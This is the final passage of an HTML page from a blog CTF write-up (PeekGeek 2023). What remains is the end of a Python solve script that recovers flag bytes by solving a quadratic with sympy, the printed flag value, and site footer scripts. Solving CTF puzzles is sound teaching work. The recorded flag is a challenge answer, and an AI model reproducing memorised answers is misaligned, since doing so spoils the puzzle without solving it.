+<span class="line" data-line="32"><span style="color:#E1E4E8">    eq </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> (i </span><span style="color:#F97583">+</span><span style="color:#79B8FF"> 128</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">**</span><span style="color:#79B8FF"> 2</span><span style="color:#F97583"> *</span><span style="color:#E1E4E8"> s </span><span style="color:#F97583">**</span><span style="color:#79B8FF"> 2</span><span style="color:#F97583"> +</span><span style="color:#E1E4E8"> (i </span><span style="color:#F97583">+</span><span style="color:#79B8FF"> 1024</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">*</span><span style="color:#E1E4E8"> s </span><span style="color:#F97583">+</span><span style="color:#E1E4E8"> (i </span><span style="color:#F97583">+</span><span style="color:#79B8FF"> 512</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">-</span><span style="color:#E1E4E8"> m1</span></span>
+<span class="line" data-line="33"><span style="color:#E1E4E8">    result </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> list</span><span style="color:#E1E4E8">(solve(eq, s))</span></span>
+<span class="line" data-line="34"><span style="color:#E1E4E8">    flag2 </span><span style="color:#F97583">+=</span><span style="color:#E1E4E8"> long_to_bytes(result[</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">]).decode(</span><span style="color:#9ECBFF">'utf-8'</span><span style="color:#E1E4E8">)</span></span>
+<span class="line" data-line="35"></span>
+<span class="line" data-line="36"><span style="color:#79B8FF">print</span><span style="color:#E1E4E8">(flag1 </span><span style="color:#F97583">+</span><span style="color:#E1E4E8"> flag2)</span></span>
+<span class="line" data-line="37"><span style="color:#6A737D"># flag{f561fafb-32ce-9d16-18fa-ec795fc1d208}</span></span></code></pre>   </section> <footer class="mt-12 pt-8 border-t border-gray-200 dark:border-gray-700"> <div class="bg-gray-50 dark:bg-gray-800 p-6 rounded-lg text-sm text-gray-700 dark:text-gray-300 space-y-2 relative overflow-hidden transition-colors duration-300">  <svg class="absolute -top-11 -right-8 w-40 h-40 opacity-10 pointer-events-none text-gray-600 dark:text-gray-400" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512" aria-hidden="true"> <path fill="currentColor" d="M245.8 214.9l-33.2 17.3c-9.4-19.6-25.2-20-27.4-20-22.2 0-33.3 14.6-33.3 43.9 0 23.5 9.2 43.8 33.3 43.8 14.4 0 24.6-7 30.5-21.3l30.6 15.5a73.2 73.2 0 01-65.1 39c-22.6 0-74-10.3-74-77 0-58.7 43-77 72.6-77 30.8-.1 52.7 11.9 66 35.8zm143 0l-32.7 17.3c-9.5-19.8-25.7-20-27.9-20-22.1 0-33.2 14.6-33.2 43.9 0 23.5 9.2 43.8 33.2 43.8 14.5 0 24.7-7 30.5-21.3l31 15.5c-2 3.8-21.3 39-65 39-22.7 0-74-9.9-74-77 0-58.7 43-77 72.6-77C354 179 376 191 389 214.8zM247.7 8C104.7 8 0 123 0 256c0 138.4 113.6 248 247.6 248C377.5 504 496 403 496 256 496 118 389.4 8 247.6 8zm.8 450.8c-112.5 0-203.7-93-203.7-202.8 0-105.5 85.5-203.3 203.8-203.3A201.7 201.7 0 01451.3 256c0 121.7-99.7 202.9-202.9 202.9z"></path> </svg>  <div class="relative z-10 space-y-2"> <div> <strong>本文作者：</strong> <span>iami233</span> </div> <div> <strong>本文链接：</strong> <a href="https://5ime.cn/peekgeek-2023/index.html" target="_blank" rel="noopener" class="text-blue-600 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-300 break-all transition-colors duration-300"> https://5ime.cn/peekgeek-2023/index.html </a> </div> <div> <strong>版权声明：</strong> <span>本文采用 </span> <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/cn/" target="_blank" rel="noopener noreferrer" class="text-blue-600 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-300 transition-colors duration-300">
+CC BY-NC-SA 4.0 CN
+</a> <span> 协议进行许可</span> </div> </div> </div> </footer> <div id="waline" class="transition-colors duration-300"></div> <script type="module" src="/_astro/Comment.astro_astro_type_script_index_0_lang.DMKo1lxI.js"></script>  </div> <div id="custom-lightbox" class="lightbox" style="display: none;" data-astro-cid-vqtgpguw>  <div id="lightbox-images" data-astro-cid-vqtgpguw></div> <div class="toolbar" data-astro-cid-vqtgpguw> <div class="counter" data-astro-cid-vqtgpguw> <span data-astro-cid-vqtgpguw><b id="current" data-astro-cid-vqtgpguw>1</b>/<span id="total" data-astro-cid-vqtgpguw>0</span></span> </div> <div class="nav" data-astro-cid-vqtgpguw> <div class="btn" id="prev" data-astro-cid-vqtgpguw> <svg width="20" height="20" viewBox="0 0 48 48" fill="none" data-astro-cid-vqtgpguw> <path d="M31 36L19 24L31 12" stroke="white" stroke-width="4" stroke-linecap="round" stroke-linejoin="round" data-astro-cid-vqtgpguw></path> </svg> </div> <div class="btn" id="next" data-astro-cid-vqtgpguw> <svg width="20" height="20" viewBox="0 0 48 48" fill="none" data-astro-cid-vqtgpguw> <path d="M19 12L31 24L19 36" stroke="white" stroke-width="4" stroke-linecap="round" stroke-linejoin="round" data-astro-cid-vqtgpguw></path> </svg> </div> </div> <div class="btn" id="close" data-astro-cid-vqtgpguw> <svg width="16" height="16" viewBox="0 0 48 48" fill="none" data-astro-cid-vqtgpguw> <path d="M8 8L40 40M8 40L40 8" stroke="white" stroke-width="4" stroke-linecap="round" stroke-linejoin="round" data-astro-cid-vqtgpguw></path> </svg> </div> </div> </div> <script type="module">class o{index=0;images=[];elements;constructor(){this.elements={lightbox:document.getElementById("custom-lightbox"),container:document.getElementById("lightbox-images"),prev:document.getElementById("prev"),next:document.getElementById("next"),close:document.getElementById("close"),current:document.getElementById("current"),total:document.getElementById("total")},this.init()}init(){this.elements.prev.onclick=()=>this.navigate(-1),this.elements.next.onclick=()=>this.navigate(1),this.elements.close.onclick=()=>this.close(),this.elements.lightbox.onclick=e=>{e.target===this.elements.lightbox&&this.close()},document.onkeydown=e=>{this.elements.lightbox.style.display==="flex"&&(e.key==="ArrowLeft"?this.navigate(-1):e.key==="ArrowRight"?this.navigate(1):e.key==="Escape"&&this.close())}}open(e,t=0){this.images=e,this.index=t,this.render(),this.elements.lightbox.style.display="flex",this.elements.lightbox.classList.remove("exit"),document.body.style.overflow="hidden"}navigate(e){const t=this.index+e;t>=0&&t<this.images.length&&(this.index=t,this.render())}render(){const{src:e,alt:t}=this.images[this.index],i=new Image;i.onload=()=>{this.elements.container.innerHTML=`<img src="${e}" alt="${t}">`;const s=this.elements.container.querySelector("img");if(window.innerWidth>768){const n=window.innerWidth*.8,l=window.innerHeight*.75;(i.naturalWidth>n||i.naturalHeight>l)&&(s.style.maxWidth=`${n}px`,s.style.maxHeight=`${l}px`)}requestAnimationFrame(()=>s.classList.add("show"))},i.src=e,this.elements.current.textContent=(this.index+1).toString(),this.elements.total.textContent=this.images.length.toString(),this.elements.prev.style.opacity=this.index===0?"0.3":"1",this.elements.next.style.opacity=this.index===this.images.length-1?"0.3":"1"}close(){this.elements.lightbox.classList.add("exit"),document.body.style.overflow="",setTimeout(()=>this.elements.lightbox.style.display="none",300)}}window.customLightbox=new o;</script> </article> </main> <footer class="py-8 px-4 pb-12 text-center text-gray-700 dark:text-gray-400" role="contentinfo" aria-label="网站页脚"> <p>&copy; 2026 iami233. All rights reserved.</p> </footer> <!-- Google Analytics --> <script async src="https://www.googletagmanager.com/gtag/js?id=G-8Z68BHM5GN"></script> <script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-8Z68BHM5GN');
+</script> <script type="module">document.addEventListener("DOMContentLoaded",()=>{const e=document.getElementById("article");if(e&&window.customLightbox){const n=e.getElementsByTagName("img"),o=[];Array.from(n).forEach((t,a)=>{t.alt||(t.alt=`文章配图 ${a+1}`),o.push({src:t.src,alt:t.alt}),t.style.cursor="pointer",t.addEventListener("click",()=>{window.customLightbox.open(o,a)})})}});</script> <script type="module">document.addEventListener("DOMContentLoaded",()=>{const o=document.querySelectorAll("[data-live-photo]");if(!o.length)return;const e=()=>{o.forEach(t=>{t.setAttribute("data-live-photo-initialized","true")})},i=()=>{const{LivePhotosKit:t}=window;try{t?.Player?.initialize()}catch(n){console.error("LivePhotosKit 初始化失败:",n)}e()};if(window.LivePhotosKit)i();else{const t=document.createElement("script");Object.assign(t,{src:"https://cdn.apple-livephotoskit.com/lpk/1/livephotoskit.js",async:!0,crossOrigin:"anonymous",onerror:()=>{console.error("LivePhotosKit 脚本加载失败"),e()},onload:()=>setTimeout(i,100)}),document.head.appendChild(t)}});</script></body></html>
